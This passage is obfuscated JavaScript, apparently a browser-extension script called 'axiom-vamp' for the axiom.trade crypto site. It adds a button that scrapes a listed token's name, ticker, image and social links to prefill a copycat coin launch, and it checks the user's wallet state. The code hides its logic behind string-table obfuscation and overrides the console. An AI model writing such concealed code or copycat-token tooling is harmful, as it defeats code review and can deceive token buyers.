      "yNH5q0S",
      "C2vHCMnO",
      "qxvMs2S",
      "Aw1Nw3nYyYO9jW",
      "icaGicaGicaGia",
      "AhjLzG",
      "zwW9j25VB3bLBG",
      "Dg9tDhjPBMC",
      "DhjPBq",
      "zw50AwnHDgvK",
      "mJe4nti4t1b2y0Pr",
      "DeXPC3rLBMvY",
      "kcGOlISPkYKRkq",
      "B2jZzxj2zq",
      "CMvHDguTyNrUia",
      "DwXSlM9IAMvJDa",
      "C3jJ",
      "A2DYB3vUzfnLyW",
      "z2v0q29UBMvJDa",
      "Ew91DhvIzsDD",
      "Ahr0Chm6lY8QlG",
      "yNv0Dg9U",
      "zwfYy2GIxsK",
      "ufP5sMK",
      "z3HIu2G",
      "y2vUDgvYoWOGia",
      "Bc1SAw5L",
      "ywrKrxzLBNrmAq",
      "Dc5PDgvTCY1Jzq",
      "s2jOzue",
      "zhjOBLm",
      "Ce1bq3G",
      "Aw5MBW",
      "D2fYBG",
      "mJiXmta4n2XztMvmzq",
      "C3rLBMvY",
      "x2jSyw5Rj11BCG",
    ];
    return (MR = function () {
      return t;
    })();
  }
  function LR(t, e) {
    const n = MR();
    return (
      (LR = function (e, r) {
        let o = n[(e -= 228)];
        if (void 0 === LR.hHHWzO) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (LR.PVJTkM = i), (t = arguments), (LR.hHHWzO = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.eLtGLA = t),
              (this.ealJES = [1, 0, 0]),
              (this.YgbLMW = function () {
                return "newState";
              }),
              (this.oATyTB = "\\w+ *\\(\\) *{\\w+ *"),
              (this.cdTVhL = "['|\"].+['|\"];? *}");
          };
          (e.prototype.EjnFji = function () {
            const t = new RegExp(this.oATyTB + this.cdTVhL).test(
              this.YgbLMW.toString()
            )
              ? --this.ealJES[1]
              : --this.ealJES[0];
            return this.QyhHUO(t);
          }),
            (e.prototype.QyhHUO = function (t) {
              return Boolean(~t) ? this.gLfjMw(this.eLtGLA) : t;
            }),
            (e.prototype.gLfjMw = function (t) {
              for (let e = 0, n = this.ealJES.length; e < n; e++)
                this.ealJES.push(Math.round(Math.random())),
                  (n = this.ealJES.length);
              return t(this.ealJES[0]);
            }),
            new e(LR).EjnFji(),
            (o = LR.PVJTkM(o)),
            (t[s] = o);
        }
        return o;
      }),
      LR(t, e)
    );
  }
  RR(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const NR = {
    matches: [
      ER(260) + "axiom.trad" + ER(337),
      "https://*." + ER(348) + ER(291),
    ],
    runAt: ER(353) + "dle",
    main() {
      const t = 331,
        e = 246,
        n = 377,
        r = 256,
        o = 350,
        i = 369,
        s = 298,
        a = 284,
        u = 254,
        c = 314,
        l = 244,
        d = 351,
        f = 282,
        h = 244,
        p = 356,
        m = 372,
        g = 364,
        y = 347,
        w = 265,
        v = 336,
        A = 317,
        k = 385,
        I = 310,
        S = 330,
        _ = 244,
        T = 339,
        B = 284,
        C = 338,
        E = 379,
        P = 270,
        O = 233,
        R = 354,
        M = 344,
        L = 362,
        N = 326,
        D = 363,
        U = 287,
        q = 248,
        z = 328,
        K = 307,
        W = 269,
        F = 280,
        j = 305,
        G = 391,
        V = 342,
        H = 307,
        Z = 245,
        X = 245,
        J = 297,
        Y = 306,
        Q = 358,
        $ = 375,
        tt = 327,
        et = 311,
        nt = 290,
        rt = 249,
        ot = 315,
        it = 295,
        st = 301,
        at = 359,
        ut = 380,
        ct = 285,
        lt = 332,
        dt = 267,
        ft = 390,
        ht = 326,
        pt = 281,
        mt = 253,
        gt = 366,
        yt = 367,
        wt = 235,
        bt = 381,
        vt = 234,
        At = 292,
        kt = 275,
        It = 300,
        St = 232,
        _t = 235,
        Tt = 355,
        Bt = 357,
        Ct = 370,
        Et = 261,
        xt = ER,
        Pt = {
          DBbji: "[data-route]",
          rtWGT: xt(237),
          LDHKs: function (t, e) {
            return t !== e;
          },
          qvOiq: "popstate",
          hrAJj: "/pulse",
          drhnS: function (t) {
            return t();
          },
          EtGWT: function (t) {
            return t();
          },
          vFkYi: function (t, e) {
            return t(e);
          },
          FDWXw: xt(t) + "er-x-line",
          djzeF: "a[target='" + xt(276) + xt(e) + "er noreferrer']",
          QXpLn: function (t, e) {
            return t > e;
          },
          QwfUQ: "img.rounde" + xt(n) + "w-full.h-f" + xt(255) + "-cover",
          KbheA: xt(r),
          HbDBp: function (t, e) {
            return t > e;
          },
          oSbYz: "Unknown er" + xt(o),
          ldmdv: function (t, e) {
            return t === e;
          },
          doKia: "object",
          HIawO: "href",
          LWiQp: "x.com/",
          LQQga: xt(308),
          vOwcb: "style",
        };
      CR(Pt[xt(i)]);
      const Ot = document[xt(s) + "ent"](Pt.vOwcb);
      (Ot[xt(313) + "t"] =
        xt(a) +
        "   .coin-c" +
        xt(u) +
        "{\n                position: re" +
        xt(c) +
        xt(l) +
        xt(d) +
        xt(f) +
        "x;\n                padding: 0;" +
        xt(a) +
        "       width: 24px;\n" +
        xt(h) +
        "      height: 24px;\n" +
        xt(h) +
        "      font-size: 16p" +
        xt(p) +
        xt(346) +
        "ont-weight" +
        xt(m) +
        xt(244) +
        "    cursor" +
        xt(316) +
        xt(a) +
        xt(364) +
        "der: none;\n         " +
        xt(g) +
        "der-radius: 4px;\n             " +
        xt(y) +
        "und-color: #008CBA;\n                color: white;\n                display: flex;\n                align-items: " +
        xt(w) +
        xt(l) +
        "    justify-content: center;\n           " +
        xt(v) +
        "ition: background-co" +
        xt(A) +
        "ase;\n                line-height: 1;\n            }\n         " +
        xt(k) +
        xt(I) +
        xt(S) +
        xt(_) +
        xt(T) +
        "ound-color" +
        xt(361) +
        xt(B) +
        xt(C) +
        "   "),
        document[xt(E)].appendChild(Ot);
      let Rt = null,
        Mt = null,
        Lt = location.pathname;
      const Nt = () => {
          const t = xt,
            e = {};
          return (
            (e.className = "coin-creat" + t(Bt)),
            (e.textContent = "C"),
            Object.assign(document["createElem" + t(Ct)](t(Et)), e)
          );
        },
        Dt = () => {
          Rt && (Rt[xt(Tt)](), (Rt = null)),
            Mt && (Mt.disconnect(), (Mt = null));
        },
        Ut = () => {
          const t = xt,
            e = window.location[t(_t)] + window.location[t(241)];
          e !== Lt && ((Lt = e), Dt(), setTimeout(qt, 100));
        },
        qt = () => {
          const t = xt;
          location[t(wt)][t(283)](Pt[t(bt)])
            ? Pt.drhnS(zt)
            : location.pathname[t(283)](t(vt)) && Pt[t(233)](Kt);
        },
        zt = () => {
          const t = 376,
            e = 242,
            n = 271,
            r = 309,
            o = 312,
            i = 304,
            s = 305,
            a = 280,
            u = 391,
            c = 262,
            l = 322,
            d = 289,
            f = 371,
            h = 358,
            p = 318,
            m = 383,
            g = 368,
            y = 307,
            w = 306,
            v = 283,
            A = 294,
            k = 280,
            I = 305,
            S = 389,
            _ = 349,
            T = 305,
            B = 280,
            C = 229,
            E = 228,
            P = 358,
            O = 315,
            R = 236,
            M = 295,
            L = 230,
            N = 384,
            D = 240,
            U = 382,
            q = 323,
            z = 270,
            K = xt,
            W = {
              bxyCK: "click",
              KZLVC: function (t, e) {
                return t(e);
              },
              oAxcV: function (t, e) {
                return Pt.vFkYi(t, e);
              },
              dhkUn: function (t, e) {
                return t(e);
              },
              ojtsn: "href",
              LpVcU: Pt.FDWXw,
              mpJYN: "i.ri-instagram-line",
              jlbcr:
                K(ht) +
                "textPrimary.text-\\[16px\\].font" +
                K(352) +
                "acking-\\[-" +
                K(341) +
                "truncate",
              LclQy: "img.w-\\[68px\\].h-\\[6" + K(pt) + "ct-cover",
              KRXFk: Pt.djzeF,
              tVCRL: function (t, e) {
                return Pt[K(299)](t, e);
              },
              bcyzR: function (t) {
                return Pt[K(z)](t);
              },
            },
            F = () => {
              const t = K,
                e = document[t(280) + "torAll"](
                  "div.bg-bac" + t(257) + t(yt) + t(343) + t(320)
                );
              for (let n = 0; n < e.length; ++n) j(e[n]);
            },
            j = (t) => {
              const e = K;
              if (t.querySelector(".coin-create-btn")) return;
              const n = t["querySelec" + e(305)](
                "div.flex.f" +
                  e(L) +
                  "\\[18px\\].w-full.gap-\\[4px\\].ju" +
                  e(N) +
                  e(268) +
                  "nter.min-w-0"
              );
              if (!n) return;
              const r = Nt();
              r.addEventListener(W[e(D)], (n) => {
                const r = e;
                n.preventDefault(), n[r(q) + "ation"](), G(t);
              }),
                n[e(U) + "re"](r, n.firstChild);
            },
            G = async (t) => {
              var e;
              const n = K;
              try {
                const r = Yg.getInstance();
                if (!r.isUserAuthenticated()) {
                  if (!(await gy(() => r.isUserAuthenticated() === !![])))
                    return x(null), void 0;
                }
                if (!r.hasToken()) {
                  if (!(await W.KZLVC(gy, () => r[n(324)]() === !![])))
                    return x(null), void 0;
                }
                const o = $g[n(P) + "e"]();
                if (o.hasWallet()) {
                  const t = o[n(O)]();
                  await (null == (e = Lg.getRpcClient())
                    ? void 0
                    : e[n(R) + n(M)](null == t ? void 0 : t.publicKey));
                }
                await VO(r[n(258) + "ion"]()), W.oAxcV(x, W.dhkUn(V, t));
              } catch (r) {
                W.dhkUn(x, null);
              }
            },
            V = (x) => {
              var P, O;
              const R = K,
                M = {};
              (M.cWToq = W[R(t)]),
                (M[R(e)] = W.LpVcU),
                (M[R(n)] = R(r) + "l-line"),
                (M[R(389)] = R(o) + "m"),
                (M.xoIEF = W[R(i)]);
              const L = M;
              try {
                const t = x["querySelec" + R(s)](W.jlbcr),
                  e =
                    (null == (P = null == t ? void 0 : t.textContent)
                      ? void 0
                      : P.trim()) || "",
                  n = x[R(a) + "tor"]("button > span.block.truncate"),
                  r =
                    (null == (O = null == n ? void 0 : n.textContent)
                      ? void 0
                      : O.trim()) || "",
                  o = x[R(280) + "tor"](W.LclQy),
                  i = (null == o ? void 0 : o.getAttribute("src")) || "";
                let m = "",
                  b = "";
                const M = [],
                  N = x.querySelector(
                    'a[href*="x.com/"]:no' +
                      R(u) +
                      '/search"]), a[href*=' +
                      R(386) +
                      'om/"]:not([href*="/s' +
                      R(c)
                  );
                if ((N && (m = N.getAttribute(W.ojtsn) || ""), !m)) {
                  const t = x.querySelector(W[R(l)]);
                  if (t) {
                    const e = t.closest("a");
                    m = (null == e ? void 0 : e.getAttribute("href")) || "";
                  }
                }
                const D = x.querySelectorAll(W.KRXFk),
                  U = [];
                D.forEach((t) => {
                  const e = R,
                    n = t.getAttribute(L.cWToq) || "";
                  n[e(v)]("x.com/") ||
                    n.includes(e(A) + "m/") ||
                    t[e(k) + "tor"](L.AufKk) ||
                    ((t["querySelec" + e(I)](L.pMACx) ||
                      n.includes(L[e(S)]) ||
                      n[e(283)](e(_)) ||
                      t["querySelec" + e(T)](e(243) + e(259)) ||
                      n[e(283)]("tiktok.com") ||
                      t[e(B) + e(I)](e(C) + "k-line") ||
                      n.includes("instagram." + e(E)) ||
                      t.querySelector(L.xoIEF)) &&
                      U.push(n));
                });
                x[R(a) + R(d)](R(f) + 'youtube"]')[R(297)]((t) => {
                  const e = R,
                    n = t[e(g)]("a");
                  if (n) {
                    const t = n[e(y) + "te"]("href") || "";
                    !U.includes(t) && U[e(w)](t);
                  }
                }),
                  W.tVCRL(U.length, 0) && ((b = U[0]), M.push(...U.slice(1)));
                const q = Qg[R(h) + "e"]()[R(p) + "s"]();
                return {
                  coinName: r,
                  ticker: e,
                  initialLiquidity:
                    (null == q ? void 0 : q.defaultSol.toString()) || "1",
                  twitterUrl: m,
                  websiteUrl: b,
                  additionalWebsites: M,
                  images: i ? [i] : [],
                  selectedImage: i,
                };
              } catch (N) {
                return { ...W[R(m)](b) };
              }
            };
          Rt = new MutationObserver(F);
          const H = {};
          (H[K(329)] = !![]),
            (H.subtree = !![]),
            Rt[K(mt)](document[K(gt)], H),
            F();
        },
        Kt = () => {
          const t = 355,
            e = 283,
            n = 283,
            r = 280,
            o = 266,
            i = 283,
            s = 264,
            a = 283,
            u = 306,
            c = xt,
            l = {
              zPmCy: function (t) {
                return t();
              },
              gPUky: c(R),
              FyfKl: function (t, e) {
                return t(e);
              },
              ZuWja: function (t) {
                return Pt.drhnS(t);
              },
              WySXo: Pt[c(M)],
              CiLlV: Pt[c(L)],
              SWpYp: c(331) + c(286),
              PiwHS: "youtube.com",
              gxbSh: "youtu.be",
              buIYY: "i.ri-tiktok-line",
            },
            d = () => {
              const t = c,
                e = document.querySelector(
                  t(ut) +
                    t(277) +
                    "ex-1.gap-\\[12px\\].justify-end.items-center"
                );
              if (!e) return ![];
              if (e.querySelector(t(ct) + t(lt))) return !![];
              const n = l.zPmCy(Nt);
              return (
                n[t(dt) + "stener"](l.gPUky, async (t) => {
                  t.preventDefault(), t.stopPropagation(), await f();
                }),
                e[t(382) + "re"](n, e[t(ft)]),
                !![]
              );
            },
            f = async () => {
              var t;
              const e = c;
              try {
                const n = Yg[e(358) + "e"]();
                if (!n[e(nt) + e(rt)]()) {
                  if (
                    !(await l.FyfKl(
                      gy,
                      () => n[e(290) + "enticated"]() === !![]
                    ))
                  )
                    return x(null), void 0;
                }
                if (!n.hasToken()) {
                  if (!(await l.FyfKl(gy, () => n.hasToken() === !![])))
                    return x(null), void 0;
                }
                const r = $g.getInstance();
                if (r.hasWallet()) {
                  const n = r[e(ot)]();
                  await (null == (t = Lg.getRpcClient())
                    ? void 0
                    : t["getCachedB" + e(it)](null == n ? void 0 : n[e(st)]));
                }
                await VO(n["getConnect" + e(303)]()), x(l[e(at)](h));
              } catch (n) {
                x(null);
              }
            },
            h = () => {
              var t;
              const d = c;
              try {
                const c = document.querySelector(
                    d(N) +
                      "textPrimar" +
                      d(D) +
                      "6px\\].lead" +
                      d(U) +
                      "\\].font-medium.tracking-\\[-0\\.02em\\]"
                  ),
                  f =
                    (null == (t = null == c ? void 0 : c.textContent)
                      ? void 0
                      : t[d(q)]()) || "",
                  h = document[d(280) + d(305)](Pt[d(z)]),
                  p = (null == h ? void 0 : h[d(K) + "te"]("alt")) || "",
                  m = (null == h ? void 0 : h.getAttribute(Pt[d(W)])) || "";
                let g = "";
                const y = document[d(F) + d(j)](
                  'a[href*="x.com/"]:no' +
                    d(G) +
                    '/search"])' +
                    d(V) +
                    '*="/axiomexchange"]), a[href*="twitter.com/"]:not([href*="/search"]):not([href*="/axiomexchange"])'
                );
                if ((y && (g = y[d(H) + "te"](d(Z)) || ""), !g)) {
                  const t = document["querySelec" + d(j)](
                    "i.ri-twitter-x-line"
                  );
                  if (t) {
                    const e = t.closest("a");
                    g = (null == e ? void 0 : e.getAttribute(d(X))) || "";
                  }
                }
                const w = document.querySelectorAll(Pt[d(239)]),
                  b = [];
                w[d(J)]((t) => {
                  const e = d,
                    c = t.getAttribute(l.WySXo) || "";
                  c.includes(l[e(279)]) ||
                    c[e(n)](e(294) + "m/") ||
                    t[e(r) + e(305)](l.SWpYp) ||
                    ((t.querySelector("i.ri-globa" + e(o)) ||
                      c.includes(l.PiwHS) ||
                      c[e(i)](l[e(s)]) ||
                      t.querySelector("img[src*='youtube']") ||
                      c[e(a)]("tiktok.com") ||
                      t.querySelector(l.buIYY) ||
                      c.includes("instagram.com") ||
                      t.querySelector("i.ri-insta" + e(373))) &&
                      b[e(u)](c));
                });
                document
                  .querySelectorAll('img[src*="youtube"]')
                  .forEach((t) => {
                    const n = d,
                      r = t.closest("a");
                    if (r) {
                      const t = r.getAttribute(l.WySXo) || "";
                      !b[n(e)](t) && b[n(306)](t);
                    }
                  });
                let v = "";
                const A = [];
                Pt.HbDBp(b[d(388)], 0) && ((v = b[0]), A[d(Y)](...b.slice(1)));
                const k = Qg[d(Q) + "e"]().getSettings();
                return {
                  coinName: p,
                  ticker: f,
                  initialLiquidity:
                    (null == k ? void 0 : k.defaultSol.toString()) || "1",
                  twitterUrl: g,
                  websiteUrl: v,
                  additionalWebsites: A,
                  images: m ? [m] : [],
                  selectedImage: m,
                };
              } catch (gA) {
                return (
                  Pt[d($)],
                  gA instanceof Error
                    ? gA[d(tt)]
                    : Pt[d(et)](typeof gA, "string") ||
                      (gA && typeof gA === Pt.doKia && JSON.stringify(gA)),
                  { ...b() }
                );
              }
            };
          if (d()) return;
          Mt = new MutationObserver(() => {
            const e = c;
            d() && (null == Mt ? void 0 : Mt[e(t)](), (Mt = null));
          });
          const p = { childList: !![], subtree: !![] };
          Mt.observe(document.body, p);
        },
        Wt = (() => {
          const t = 238,
            e = 293,
            n = 251,
            r = 302,
            o = 378,
            i = 378,
            s = xt,
            a = history.pushState,
            u = history.replaceState;
          (history[s(At)] = function () {
            a[s(i)](history, arguments), Ut();
          }),
            (history.replaceState = function () {
              u[s(o)](history, arguments), Ut();
            }),
            window["addEventLi" + s(kt)](Pt[s(It)], Ut);
          const c = new MutationObserver(() => {
              const t = s,
                e = document.querySelector(Pt[t(r)]);
              if (e) {
                const t = e.getAttribute(Pt.rtWGT);
                t && Pt.LDHKs(t, Lt) && Ut();
              }
            }),
            l = {};
          return (
            (l[s(St)] = !![]),
            (l[s(329)] = !![]),
            (l.subtree = !![]),
            c.observe(document.body, l),
            () => {
              const r = s;
              (history.pushState = a),
                (history[r(t) + "te"] = u),
                window[r(e) + r(n)]("popstate", Ut),
                c.disconnect();
            }
          );
        })();
      return (
        Pt[xt(P)](qt),
        () => {
          Pt[xt(O)](Dt), Wt();
        }
      );
    },
  };
  function DR(t, e) {
    const n = UR();
    return (
      (DR = function (e, r) {
        let o = n[(e -= 453)];
        if (void 0 === DR.lUcAQr) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (DR.gRDCyM = i), (t = arguments), (DR.lUcAQr = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.AWyidx = t),
              (this.YWNsVp = [1, 0, 0]),
              (this.VqigVb = function () {
                return "newState";
              }),
              (this.bIBVUU = "\\w+ *\\(\\) *{\\w+ *"),
              (this.qTlPhu = "['|\"].+['|\"];? *}");
          };
          (e.prototype.DMPCGL = function () {
            const t = new RegExp(this.bIBVUU + this.qTlPhu).test(
              this.VqigVb.toString()
            )
              ? --this.YWNsVp[1]
              : --this.YWNsVp[0];
            return this.xpOEmC(t);
          }),
            (e.prototype.xpOEmC = function (t) {
              return Boolean(~t) ? this.NFvaik(this.AWyidx) : t;
            }),
            (e.prototype.NFvaik = function (t) {
              for (let e = 0, n = this.YWNsVp.length; e < n; e++)
                this.YWNsVp.push(Math.round(Math.random())),
                  (n = this.YWNsVp.length);
              return t(this.YWNsVp[0]);
            }),
            new e(DR).DMPCGL(),
            (o = DR.gRDCyM(o)),
            (t[s] = o);
        }
        return o;
      }),
      DR(t, e)
    );
  }
  function UR() {
    const t = [
      "Dg9tDhjPBMC",
      "BMn0Aw9UkcKG",
      "qNjltw0",
      "vgrvs24",
      "nJm0ndq5nNHlwKfmuG",
      "mtmWmZu0qunfBgPv",
      "mJq2ode4seXMtMv4",
      "mZm2mZG3mKjru3rTDG",
      "C3rYAw5N",
      "mtrczLHlu0m",
      "w3D4Df0G",
      "Bg9N",
      "ndu3mtzrwMj3ExK",
      "qLjPuvG",
      "zxjYB3i",
      "C2vHCMnO",
      "y29UC29Szq",
      "x19WCM90B19F",
      "yMLUza",
      "C2TdCNLWDa",
      "zgvIDwC",
      "mZq1A09XtuTZ",
      "y3rVCIGICMv0Dq",
      "Ce5uExO",
      "BuLNuuS",
      "v3PJDNO",
      "yu9uweO",
      "mZCYAhnOuwf3",
      "ntq1nJaZn3b1q0j1sW",
      "mJy5nZG2ntbmvMXhteW",
      "Aw5MBW",
      "kcGOlISPkYKRkq",
    ];
    return (UR = function () {
      return t;
    })();
  }
  axiomVamp;
  const qR = DR;
  function zR(t, ...e) {
    const n = 466,
      r = 476,
      o = 462,
      i = 459,
      s = 484,
      a = 481,
      u = 453,
      c = 468,
      l = 471,
      d = 470,
      f = 458,
      h = 468,
      p = qR,
      m = {
        AxyPe: p(467) + "+$",
        MehRU: function (t, e) {
          return t(e);
        },
        TdUKn: function (t, e) {
          return t + e;
        },
        DgDnw: function (t, e) {
          return t + e;
        },
        BrKMm: "return (fu" + p(469),
        pNTyz: function (t) {
          return t();
        },
        xcSDg: "warn",
        nvvWB: p(n),
        dIZsw: "exception",
        BRiQX: "trace",
        aOTXJ: function (t) {
          return t();
        },
        Wzcvz: function (t) {
          return t();
        },
        QfTNu: function (t, e) {
          return t === e;
        },
        mIgQK: p(r),
      },
      g = (function () {
        let t = !![];
        return function (e, n) {
          const r = t
            ? function () {
                if (n) {
                  const t = n.apply(e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
          return (t = ![]), r;
        };
      })(),
      y = g(this, function () {
        const t = p;
        return y[t(h)]()
          [t(483)]("(((.+)+)+)+$")
          .toString()
          .constructor(y)
          .search(m.AxyPe);
      });
    m[p(o)](y);
    const w = (function () {
        let t = !![];
        return function (e, n) {
          const r = t
            ? function () {
                if (n) {
                  const t = n.apply(e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
          return (t = ![]), r;
        };
      })(),
      b = w(this, function () {
        const t = p,
          e = m[t(i)](function () {
            const t = DR;
            let e;
            try {
              e = m.MehRU(
                Function,
                m[t(l)](
                  m.DgDnw(m[t(d)], "{}.constru" + t(f) + 'rn this")( )'),
                  ");"
                )
              )();
            } catch (n) {
              e = window;
            }
            return e;
          }),
          n = (e.console = e[t(s)] || {}),
          r = ["log", m.xcSDg, m.nvvWB, "error", m.dIZsw, "table", m[t(a)]];
        for (let o = 0; o < r.length; o++) {
          const e = w.constructor.prototype[t(454)](w),
            i = r[o],
            s = n[i] || e;
          (e[t(u)] = w.bind(w)), (e.toString = s[t(c)].bind(s)), (n[i] = e);
        }
      });
    if ((m[p(461)](b), ![]))
      if (m.QfTNu(typeof e[0], m[p(460)])) {
        const n = e.shift();
        t(p(478) + n, ...e);
      } else t("[wxt]", ...e);
  }
  (function (t) {
    const e = 464,
      n = 480,
      r = 457,
      o = 463,
      i = 473,
      s = 475,
      a = 472,
      u = 465,
      c = DR,
      l = t();
    for (; []; )
      try {
        if (
          948207 ===
          (parseInt(c(477)) / 1) * (parseInt(c(474)) / 2) +
            -parseInt(c(e)) / 3 +
            (-parseInt(c(n)) / 4) * (parseInt(c(r)) / 5) +
            (-parseInt(c(o)) / 6) * (parseInt(c(i)) / 7) +
            -parseInt(c(s)) / 8 +
            parseInt(c(a)) / 9 +
            parseInt(c(u)) / 10
        )
          break;
        l.push(l.shift());
      } catch (LA) {
        l.push(l.shift());
      }
  })(UR),
    (window[qR(455)] = function (t) {
      return function () {
        return t;
      };
    });
  const KR = (...t) => zR(console[qR(482)], ...t);
  return (async () => {
    try {
      return await NR.main();
    } catch (t) {
      throw (KR('The unlisted script "axiom-vamp" crashed on startup!', t), t);
    }
  })();
})();
axiomVamp;
